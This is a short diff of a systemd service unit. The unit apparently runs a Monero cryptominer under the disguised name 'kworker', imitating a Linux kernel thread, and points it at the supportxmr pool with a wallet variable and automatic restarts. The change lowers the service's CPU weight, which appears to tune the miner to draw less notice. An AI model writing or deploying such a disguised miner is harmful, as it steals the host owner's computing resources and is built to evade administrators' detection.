@@ -32,7 +32,7 @@ After=network.target
 ExecStart=/usr/local/bin/kworker -o pool.supportxmr.com:443 -u $WALLET.$WORKER_ID -k --tls --cpu-max-threads-hint=50 --cpu-priority=3
 Restart=always
 Nice=10
-CPUWeight=10
+CPUWeight=5
 IOWeight=10
 
 [Install]
